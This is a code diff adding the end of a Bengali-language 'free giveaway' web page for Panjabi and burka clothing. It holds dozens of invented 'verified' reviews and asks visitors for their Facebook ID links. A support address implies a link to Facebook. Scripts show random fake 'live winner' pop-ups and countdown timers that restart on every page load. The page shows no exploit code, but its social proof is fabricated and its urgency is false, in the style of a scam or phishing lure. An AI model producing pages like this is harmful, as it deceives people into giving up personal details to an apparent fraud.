+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আল্লাহ আপনাদের অনেক বরকত দান করুন। দারুণ পাঞ্জাবি।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #388E3C;">X</div>
+    <div class="review-details">
+        <h4>খায়রুল বাসার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি কখনো কিছু জিতিনি এই প্রথম পেলাম। ধন্যবাদ!</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #E64A19;">Q</div>
+    <div class="review-details">
+        <h4>কুদরত ই খুদা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আসল পাঞ্জাবিটা পেয়ে আমি অবাক। কাপড় খুবই আরামদায়ক।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #5D4037;">V</div>
+    <div class="review-details">
+        <h4>ভিকি আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সারপ্রাইজ গিফট অনেক ভালো লেগেছে। ধন্যবাদ টিম।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #1976D2;">S</div>
+    <div class="review-details">
+        <h4>শাহীন আলম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আপনাদের এই চমৎকার উদ্যোগকে সাধুবাদ জানাই।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #C2185B;">E</div>
+    <div class="review-details">
+        <h4>এশিতা হক <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বিজয়ীদের জন্য অনেক শুভকামনা। গিফট অনেক কিউট।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #512DA8;">N</div>
+    <div class="review-details">
+        <h4>নাসিম আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি বন্ধুদেরও বলেছি অংশ নিতে। এটা দারুণ।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #388E3C;">T</div>
+    <div class="review-details">
+        <h4>তারেক আজিজ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">উপহার পেয়ে খুব ভালো লাগলো। আপনারা সেরা!</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #FBC02D;">P</div>
+    <div class="review-details">
+        <h4>পারভেজ শেখ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবির কালারটা অনেক গর্জিয়াস। ধন্যবাদ জানাই।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #F57C00;">M</div>
+    <div class="review-details">
+        <h4>মুনিরা বেগম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">গিফট পেয়ে অনেক আনন্দিত। বোরকার কাপড়টা প্রিমিয়াম।</p>
+    </div>
+</div>
+              
+   <div class="review-card">
+    <div class="user-img" style="background: #2E7D32;">S</div>
+    <div class="review-details">
+        <h4>সুমন পারভেজ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবির সেলাই একদম নিখুঁত। ফ্রি গিফট হিসেবে এত ভালো কোয়ালিটি অবিশ্বাস্য!</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #D81B60;">A</div>
+    <div class="review-details">
+        <h4>আয়েশা সিদ্দিকা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বোরকাটা অনেক আরামদায়ক। ইনশাআল্লাহ আবার গিভঅ্যাওয়েতে অংশ নিবো।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #1976D2;">K</div>
+    <div class="review-details">
+        <h4>কাউসার মাহমুদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">অবিশ্বাস্য! গিফটটা হাতে পাওয়ার পর আপনাদের প্রতি বিশ্বাস আরও বেড়ে গেলো।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #FBC02D;">N</div>
+    <div class="review-details">
+        <h4>নাহিদ সুলতানা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">কালারটা অনেক গর্জিয়াস। সবারই উচিত এই পেজের সাথে থাকা।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #5E35B1;">H</div>
+    <div class="review-details">
+        <h4>হৃদয় খন্দকার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">অসাধারণ কাস্টমার সার্ভিস এবং ডেলিভারিও খুব দ্রুত। ধন্যবাদ!</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #F4511E;">B</div>
+    <div class="review-details">
+        <h4>বিউটি আক্তার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি খুবই সারপ্রাইজড! এত সুন্দর গিফট পাঠানোর জন্য অনেক দোয়া রইলো।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #00897B;">T</div>
+    <div class="review-details">
+        <h4>তানভীর আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">একদম অরিজিনাল ফেব্রিক্স। অনেক দিন পর একটা ট্রাস্টেড গিভঅ্যাওয়ে পেলাম।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #6D4C41;">R</div>
+    <div class="review-details">
+        <h4>রুনা লায়লা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আলহামদুলিল্লাহ, বোরকাটা পেয়ে আমি অনেক খুশি। কোয়ালিটি সেরা!</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #039BE5;">I</div>
+    <div class="review-details">
+        <h4>ইশতিয়াক হোসেন <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সঠিক মানুষরাই এখানে বিজয়ী হয়। তাদের স্বচ্ছতা চমৎকার।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #7CB342;">M</div>
+    <div class="review-details">
+        <h4>মাহিন চৌধুরী <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবিটা পরে অনেক আরাম লাগছে। ১০০% কটন কাপড়।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #FB8C00;">F</div>
+    <div class="review-details">
+        <h4>ফারজানা ইসলাম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">এত বড় একটা গিফট ফ্রিতে পাবো কল্পনাও করিনি। ধন্যবাদ টিম।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #3949AB;">O</div>
+    <div class="review-details">
+        <h4>অপু হাসান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সত্যিকারের একটি উদ্যোগ। দোয়া করি আপনারা আরও বড় হোন।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #E53935;">P</div>
+    <div class="review-details">
+        <h4>পারভীন বেগম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বোরকাটা অনেক শালীন এবং কোয়ালিটি দারুণ। অনেক শুকরিয়া।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #00ACC1;">G</div>
+    <div class="review-details">
+        <h4>গোলাম রাব্বী <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবিটা চমৎকার। সাইজ একদম পারফেক্ট হয়েছে।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #8E24AA;">L</div>
+    <div class="review-details">
+        <h4>লায়লা চৌধুরী <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">গিফট পেয়ে ঈদের আনন্দ আগেভাগেই শুরু হয়ে গেলো। ধন্যবাদ।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #546E7A;">S</div>
+    <div class="review-details">
+        <h4>সায়েম রহমান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি বিশ্বাস করতে পারিনি যে আমি জিতবো। আপনারা সত্যিই কথা রাখেন।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #F06292;">Z</div>
+    <div class="review-details">
+        <h4>জেরিন আক্তার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">রমজানের সেরা পাঞ্জাবি গিফট পেলাম। দোয়া করি আপনাদের জন্য।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #757575;">W</div>
+    <div class="review-details">
+        <h4>ওয়াহিদুল ইসলাম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আপনাদের কাজ করার পদ্ধতি অনেক স্বচ্ছ। উপহার পেয়ে খুব খুশি।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #C0CA33;">Y</div>
+    <div class="review-details">
+        <h4>ইয়াসমিন লতা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বিনা খরচে এত প্রিমিয়াম পাঞ্জাবি পাবো কখনো ভাবিনি।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #FDD835;">U</div>
+    <div class="review-details">
+        <h4>উম্মে হাবিবা <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবিটা অনেক সুন্দর। ইনশাআল্লাহ আবার গিভঅ্যাওয়েতে অংশ নিবো।</p>
+    </div>
+</div>
+           
+              
+            </div>
+    </div>
+</div>
+
+        
+            
+            
+            
+            <div class="feature-box">
+                <i class="fas fa-info-circle"></i>
+                <h3>শর্তাবলী</h3>
+                <p>​✅ সতর্কতা: অনুগ্রহ করে কেউ কোনো ধরণের ফেক (Fake) বা ভুল আইডি দিয়ে রেজিস্ট্রেশন করবেন না। মনে রাখবেন, সিস্টেমের মাধ্যমে আমরা প্রতিটি তথ্য যাচাই করব। ভুল তথ্য বা ফেক আইডি ব্যবহার করলে আপনি বিজয়ীদের তালিকা থেকে বাদ পড়ে যেতে পারেন।
+                ​✅ আইডি লিংক : আপনার ফেসবুক আইডি লিংক দিতে ভুলবেন না। না দিলেও সমস্যা নাই তবে আইডি লিংক দিলে গিভঅ্যাওয়ে তে যেতা অনেকটাই সহজ হয়ে যাবে।</p>
+            </div>
+            <div class="feature-box">
+    <i class="fas fa-headset" style="color: #1877F2;"></i>
+    <h3>সহায়তা প্রয়োজন?</h3>
+    <p>যেকোনো জরুরি প্রয়োজনে আমাদের ফেসবুক পেজে যোগাযোগ করুন। আমরা দ্রুত আপনার সমস্যার সমাধান দিচ্ছি।</p>
+    <a href="https://www.facebook.com/groups/newburkacollection.fb/?ref=share&mibextid=NSMWBT" target="_blank" style="display: inline-block; margin-top: 10px; color: #1877F2; font-weight: bold; text-decoration: underline;">আমাদের ফেসবুক পেজে মেসেজ করুন</a>
+     <a href="https://www.facebook.com/share/1DeMCpoGqS/" target="_blank" style="display: inline-block; margin-top: 10px; color: #1877F2; font-weight: bold; text-decoration: underline;">আমাদের ফেসবুক পেজে মেসেজ করুন</a>
+       <div class="feature-box">
+    <h3>আমাদের সাথে যুক্ত থাকুন</h3>
+    <div style="display: flex; justify-content: center; gap: 20px; font-size: 2rem; margin-top: 15px;">
+        <a href="আপনার_ফেসবুক_লিঙ্ক" target="_blank" style="color: #1877F2;"><i class="fab fa-facebook"></i></a>
+        <a href="আপনার_ইনস্টাগ্রাম_লিঙ্ক" target="_blank" style="color: #E1306C;"><i class="fab fa-instagram"></i></a>
+        <a href="https://wa.me/আপনার_নম্বর" target="_blank" style="color: #25D366;"><i class="fab fa-whatsapp"></i></a>
+    </div>
+</div>
+                 
+            </section>
+            
+        </div>
+            
+                <div class="warning-box">
+    <strong>⚠️ গুরুত্বপূর্ণ সতর্কতা:</strong>
+    আমাদের এই অনুষ্ঠিত আয়োজনে অংশ নিতে কোনো প্রকার আর্থিক লেনদেনের প্রয়োজন নেই। কোনো ভুয়া বা ফেক পেজে সাইন-আপ করে প্রতারিত হবেন না। আমাদের প্রতিটি উপহার শুধুমাত্র এই অফিশিয়াল ওয়েবসাইট থেকেই পরিচালিত হয়। যেকোনো প্রয়োজনে বা নিশ্চিত হতে আমাদের সাথে যোগাযোগ করুন এখানে: <b>support@facebookgiveaway.com</b>
+</div> 
+                
+                
+
+ 
+   
+
+    <footer class="footer">
+        <a href="#" class="social-icon"><i class="fab fa-facebook-square"></i></a>
+        <p>© 2026 gift. All rights reserved.</p>
+        <p>Signature from <a href="#">support@facebookgiveaway.com</a></p>
+    </footer>
+<script>
+    var countDownDate = new Date("April 10, 2026 23:59:59").getTime();
+    var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        document.getElementById("timer").innerHTML = days + " দিন " + hours + " ঘণ্টা " + minutes + " মি: " + seconds + " সে:";
+        if (distance < 0) {
+            clearInterval(x);
+            document.getElementById("timer").innerHTML = "অফার শেষ!";
+        }
+    }, 1000);
+</script>
+<script>
+        
+        
+        
+        function openModal() { document.getElementById("reviewModal").style.display = "block"; }
+function closeModal() { document.getElementById("reviewModal").style.display = "none"; }
+window.onclick = function(event) {
+    if (event.target == document.getElementById("reviewModal")) closeModal();
+}
+
+        
+        
+        
+    // এখান থেকে সময় পরিবর্তন করুন (বর্তমানে ৪ ঘণ্টা দেওয়া আছে)
+    var hoursToCountDown = 8.4; 
+    
+    var countDownDate = new Date().getTime() + (hoursToCountDown * 60 * 60 * 1000); 
+
+    var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+
+        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        document.getElementById("timer").innerHTML = hours + " ঘণ্টা " + minutes + " মি: " + seconds + " সে:";
+
+        if (distance < 0) {
+            clearInterval(x);
+            document.getElementById("timer").innerHTML = "অফার শেষ!";
+        }
+    }, 1000);
+</script>
+
+        
+ <script>
+    // ১. পপ-আপ মডাল খোলার ফাংশন
+    function openModal() { document.getElementById("reviewModal").style.display = "block"; }
+    function closeModal() { document.getElementById("reviewModal").style.display = "none"; }
+    
+    // ২. পপ-আপের বাইরে ক্লিক করলে বন্ধ হবে
+    window.onclick = function(event) {
+        if (event.target == document.getElementById("reviewModal")) closeModal();
+    }
+
+    // ৩. লাইভ উইনার নোটিফিকেশন (উপরে ডানদিক থেকে আসবে)
+    function showLiveWinner() {
+        const winners = ["রাফসান, ঢাকা", "মিতু, চট্টগ্রাম", "সাকিব, সিলেট", "লিমা, রাজশাহী", "আরিফ, খুলনা",];
+        const gift = ["অংশ্রহণ"];
+        
+        setInterval(() => {
+            const winner = winners[Math.floor(Math.random() * winners.length)];
+            const item = gift[Math.floor(Math.random() * gift.length)];
+            
+            let toast = document.createElement("div");
+            toast.className = "toast-msg";
+            toast.innerHTML = `🎁 <b>${winner}</b> এইমাত্র <b>${item}</b> করেছেন`;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => { 
+                toast.style.animation = "slideOutRight 0.5s forwards";
+                setTimeout(() => toast.remove(), 500); 
+            }, 4000);
+        }, 14000); 
+    }
+    showLiveWinner();
+
+    // ৪. কাউন্টডাউন টাইমার
+    var hoursToCountDown = 6.3; 
+    var countDownDate = new Date().getTime() + (hoursToCountDown * 60 * 60 * 1000); 
+    var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        
+        // টাইমার টেক্সট আপডেট
+        var timerElement = document.getElementById("timer");
+        if(timerElement) {
+            timerElement.innerHTML = hours + " ঘণ্টা " + minutes + " মি: " + seconds + " সে:";
+        }
+        
+        if (distance < 0) {
+            clearInterval(x);
+            if(timerElement) timerElement.innerHTML = "অফার শেষ!";
+        }
+    }, 1000);
+</script>
+
+
+  
+        
+</body>
+</html>
